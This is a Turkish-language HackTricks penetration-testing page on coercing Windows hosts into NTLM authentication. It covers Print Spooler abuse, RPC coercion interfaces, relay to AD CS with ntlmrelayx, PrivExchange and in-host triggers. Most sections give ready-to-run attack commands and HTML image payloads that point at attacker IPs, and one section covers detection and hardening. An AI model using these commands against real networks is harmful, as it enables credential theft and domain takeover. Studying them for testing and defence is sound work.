# Privileged NTLM Authentication'ı Zorlama

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers), 3. taraf bağımlılıklarını önlemek için MIDL compiler kullanılarak C# ile kodlanmış bir **remote authentication triggers** **collection**'ıdır.

## Spooler Service Abuse

_**Print Spooler**_ servisi **enabled** ise, önceden bilinen bazı AD kimlik bilgilerini kullanarak Domain Controller’ın print server’ından yeni print job’lar hakkında bir **update** **request** edebilir ve bildirimi belirli bir sisteme **send** etmesini söyleyebilirsiniz.\
Printer bildirimi rastgele sistemlere gönderdiğinde, ilgili sistemde **authenticate** olması gerekir. Bu nedenle saldırgan, _**Print Spooler**_ servisinin rastgele bir sisteme karşı **authenticate** olmasını sağlayabilir ve servis bu authentication sırasında **computer account**'ını **use** eder.

Arka planda, klasik **PrinterBug** primitive’i **`RpcRemoteFindFirstPrinterChangeNotificationEx`** çağrısını **`\\PIPE\\spoolss`** üzerinden kötüye kullanır. Saldırgan önce bir printer/server handle açar ve ardından `pszLocalMachine` içine sahte bir client name sağlar; böylece hedef spooler, **attacker-controlled host**'a **back** bir notification channel oluşturur. Bu nedenle ortaya çıkan etki, doğrudan code execution yerine **outbound authentication coercion**'dır.<sup>[[2]](#references)</sup>\
Spooler’ın kendisinde **RCE/LPE** arıyorsanız [PrintNightmare](printnightmare.md) sayfasına bakın. Bu sayfa **coercion and relay** konusuna odaklanır.

### Domain'deki Windows Server'ları Bulma

Windows host’larını listelemek için PowerShell kullanın. Server’lar genellikle en yüksek öncelikli hedeflerdir; bu nedenle önce onlara odaklanın:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
Select-Object -ExpandProperty DNSHostName > servers.txt
```
### Dinleme yapan Spooler servislerini bulma

@mysmartlogin'ın (Vincent Le Toux) biraz değiştirilmiş [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracını kullanarak Spooler Service'in dinleme yapıp yapmadığını kontrol edin:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux'ta `rpcdump.py` kullanabilir ve **MS-RPRN** protokolünü arayabilirsiniz:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Veya Linux'tan **NetExec/CrackMapExec** ile ana bilgisayarları hızlıca test edin:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Yalnızca spooler endpoint’inin mevcut olup olmadığını kontrol etmek yerine **coercion surfaces**'i listelemek istiyorsanız **Coercer scan mode**'unu kullanın:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Bu kullanışlıdır; çünkü EPM'de endpoint'i görmek yalnızca print RPC interface'inin kayıtlı olduğunu gösterir. **Bu, mevcut yetkilerinizle her coercion method'un erişilebilir olduğunu veya host'un kullanılabilir bir authentication flow başlatacağını garanti etmez.**

### Service'ten rastgele bir host'a authenticate olmasını isteyin

[Orijinal repository'deki SpoolSample'i](https://github.com/leechristensen/SpoolSample) compile edebilirsiniz.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
veya Linux kullanıyorsanız [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ya da [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer** ile spooler arayüzlerini doğrudan hedefleyebilir ve hangi RPC yönteminin açığa çıkarıldığını tahmin etmekten kaçınabilirsiniz:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Modern RPC-over-TCP geri çağrıları

Başarılı bir `RpcRemoteFindFirstPrinterChangeNotificationEx` çağrısının mutlaka TCP/445 üzerinden trafik oluşturacağını varsaymayın. **Windows 11 22H2 ve sonraki sürümler, yazdırma iletişimleri için varsayılan olarak RPC over TCP kullanır**; ilke veya `RpcUseNamedPipeProtocol=1` named pipe üzerinden RPC'yi yeniden etkinleştirmediği sürece devre dışıdır. Bu nedenle, yalnızca SMB dinleyen eski dinleyiciler tetikleyicinin gönderildiğini bildirebilir ancak geri çağrıyı hiçbir zaman alamaz. Microsoft, normal yazdırma RPC'si için TCP/135 (Endpoint Mapper) ile dinamik RPC portlarının kullanıldığını belgeler; kuruluşlar bu aralığı kısıtlayabilir veya sabit bir yazdırma RPC portu seçebilir.<sup>[[10]](#references)</sup>

Güncel **Impacket `ntlmrelayx.py`**, varsayılan olarak TCP/135 üzerinde etkinleştirilen bir RPC relay server ve küçük bir Endpoint Mapper içerir. Bu destek, kimliği doğrulanmış RPC geri çağrısının relay edilmesini sağlamak amacıyla, kurban SMB/WebDAV'a geri dönmese bile, PrinterBug-to-AD-CS chain gösterimiyle birlikte özellikle Haziran 2025'te birleştirildi.<sup>[[11]](#references)</sup>

RPC relay/EPM desteği **Impacket 0.13.0 ve sonraki sürümlerinde** bulunur. Eksik bir TCP/135 dinleyicisini debug etmeden önce, daha eski bir paketlenmiş `ntlmrelayx.py` dosyasının çalıştırılmadığını doğrulayın; yardım çıktısında her iki RPC-server switch'i de görünmelidir.<sup>[[12]](#references)</sup>
```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
`Setting up RPC Server on port 135` ve `RPCD: Received connection` ifadelerini relay çıktısında arayın. RPC çağrısı beklenen bir hata döndürüyor ancak listener'a hiçbir şey ulaşmıyorsa, kurbanın print RPC transport policy ayarlarını, outbound filtering durumunu, DNS resolution işlemini ve başka bir process'in TCP/135'e zaten sahip olup olmadığını kontrol edin. Ayrıca `ntlmrelayx`'in `--no-rpc-server` ile başlatılmadığından emin olun.

### WebClient ile SMB yerine HTTP'yi zorlama

Hâlâ **RPC over named pipes** kullanan sistemlerde (legacy build'ler veya policy ile geri yüklenmiş davranış), klasik PrinterBug genellikle `\\attacker\share` adresine bir **SMB** authentication işlemi gerçekleştirir; bu işlem **capture**, **HTTP targets'a relay** veya **SMB signing** bulunmayan ortamlara **relay** için hâlâ kullanışlıdır.\
Ancak **SMB'den SMB'ye** relay işlemi çoğunlukla **SMB signing** tarafından engellenir; bu nedenle operatörler bunun yerine **HTTP/WebDAV** authentication işlemini zorlamayı tercih edebilir. Bu, yukarıda açıklanan RPC-over-TCP davranışı için bir fallback değildir.

Hedefte **WebClient** service çalışıyorsa listener, Windows'un **WebDAV over HTTP** kullanmasını sağlayan bir biçimde belirtilebilir:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Bu, **`ntlmrelayx --adcs`** veya diğer HTTP relay hedefleriyle zincirleme kullanımda özellikle faydalıdır; çünkü zorlanan bağlantıda SMB relay yapılabilirliğine güvenme gereğini ortadan kaldırır. Önemli uyarı: HTTP/WebDAV varyantının çalışması için kurban üzerinde **WebClient** çalışıyor olmalıdır.

### Unconstrained Delegation ile birleştirme

Bir saldırgan [Unconstrained Delegation](unconstrained-delegation.md) için yapılandırılmış bir bilgisayarı ele geçirdiyse, **printer'ı bu bilgisayara authenticate olmaya zorlayabilir**. Printer bilgisayar hesabının **TGT**'si daha sonra unconstrained-delegation host'un belleğinde cache'lenir; saldırgan da bu TGT'yi [Pass the Ticket](pass-the-ticket.md) ile alıp yeniden kullanabilir.

### Detection ve hardening notları

Yazdırma yapmayan bir DC, PAW veya server'dan PrinterBug'ı kaldırmanın en güvenilir yolu Spooler'ı durdurmak ve devre dışı bırakmaktır. Yazdırma gerekiyorsa, callback path üzerinde TCP/445'i engellemenin yeterli olduğunu varsaymak yerine, olası tüm relay hedeflerini harden edin (SMB server signing, LDAP signing/channel binding ve AD CS gibi HTTP servislerinde EPA).<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Host hâlâ **yerel yazdırma** gerektiriyorsa daha dar kapsamlı bir kontrol, `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled` GPO'sudur. Bu, service'i yerel olarak kullanılabilir bırakırken spooler'ın uzak client bağlantılarını (ve printer sharing'i) kabul etmesini engeller; uyguladıktan sonra spooler'ı yeniden başlatın, ardından yukarıdaki MS-RPRN erişilebilirlik kontrollerini tekrarlayın.<sup>[[13]](#references)</sup>

Detection, MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab` için yapılan authenticated bir çağrıyı, özellikle yerel olmayan bir callback değeriyle opnum 62/65'i ve spooler host'undan hemen sonra gerçekleşen outbound SMB, HTTP veya RPC bağlantısını ilişkilendirmelidir. Yalnızca `\PIPE\spoolss` erişimini değil, **interface UUID/opnum ve source/destination çiftlerini** baseline olarak izleyin; çünkü güncel print stack'leri callback'i RPC-over-TCP üzerinden gerçekleştirebilir.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (outbound auth tetikleyen interface/opnum'lar)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnum'lar: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notlar: aynı spooler pipe üzerindeki asynchronous print interface; belirli bir host üzerindeki erişilebilir method'ları enumerate etmek için Coercer kullanın<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipe'lar: \\PIPE\\efsrpc (ayrıca \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon üzerinden)
- IF UUID'ler: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Yaygın olarak abuse edilen opnum'lar: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnum'lar: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnum'lar: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Not: Bu method'lar UNC path taşıyabilen parametreleri kabul eder (ör. `\\attacker\share`). İşlendiğinde Windows, bu UNC'ye machine/user context ile authenticate olur ve NetNTLM capture veya relay yapılmasını sağlar.\
Spooler abuse için **MS-RPRN opnum 65**, protocol specification'ın server'ın `pszLocalMachine` ile belirtilen client'a geri bir notification channel oluşturduğunu açıkça belirtmesi nedeniyle en yaygın ve en iyi belgelenmiş primitive olmaya devam etmektedir.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: \\PIPE\\even üzerinden MS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Etki: target, sağlanan backup log path'ini açmayı dener ve attacker-controlled UNC'ye authenticate olur.<sup>[[1]](#references)</sup>
- Pratik kullanım: Tier 0 asset'lerini (DC/RODC/Citrix/etc.) NetNTLM göndermeye zorlamak, ardından bunu AD CS endpoint'lerine (ESC8/ESC11 senaryoları) veya diğer privileged service'lere relay etmek.<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack, **Exchange Server `PushSubscription` feature'ında** bulunan bir flaw'ın sonucudur. Bu feature, mailbox sahibi herhangi bir domain user tarafından Exchange server'ın HTTP üzerinden client tarafından sağlanan herhangi bir host'a authenticate olmaya zorlanabilmesini sağlar.

Varsayılan olarak **Exchange service SYSTEM olarak çalışır** ve aşırı privileges'a sahiptir (özellikle, **2019 öncesi Cumulative Update'te domain üzerinde `WriteDacl privileges` bulunur**). Bu flaw, **information'ın LDAP'ye relay edilmesini ve ardından domain NTDS database'inin extract edilmesini** sağlamak için exploit edilebilir. LDAP'ye relay mümkün olmadığında bile bu flaw, domain içindeki diğer host'lara relay ve authenticate olmak için kullanılabilir. Bu attack'in başarılı şekilde exploit edilmesi, authenticated herhangi bir domain user account ile Domain Admin'e anında erişim sağlar.

## Windows İçinde

Windows machine'ın zaten içindeyseniz, privileged account'ları kullanarak Windows'ı bir server'a bağlanmaya şu şekilde zorlayabilirsiniz:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Veya şu diğer tekniği kullanın: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

NTLM authentication'ı zorlamak için certutil.exe lolbin'ini (Microsoft tarafından imzalanmış binary) kullanmak mümkündür:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### E-posta yoluyla

Ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, ona aşağıdaki gibi **1x1 boyutunda bir görsel içeren e-posta** gönderebilirsiniz:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Mağdur bunu açtığında Windows kimlik doğrulamaya çalışır.

### MitM

Bir MitM saldırısı gerçekleştirebiliyor ve mağdurun görüntülediği bir sayfaya HTML enjekte edebiliyorsanız aşağıdaki gibi bir görüntü enjekte etmeyi deneyin:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM authentication'ını zorlamanın ve phishing yapmanın diğer yolları


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

[NTLMv1 challenge'larını yakalayabiliyorsanız, bunların nasıl crack edileceğini buradan okuyun](../ntlm/index.html#ntlmv1-attack).\
_ NTLMv1'i crack etmek için Responder challenge değerini "1122334455667788" olarak ayarlamanız gerektiğini unutmayın._



## References

- [1] [Unit 42 – Authentication Coercion gelişmeye devam ediyor](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Windows 11'de yazdırma için RPC connection güncellemeleri](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – ntlmrelayx için RPC relay server ve Endpoint Mapper](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 sürümü](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Print Spooler'ın client connection'larını kabul etmesine izin verme](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
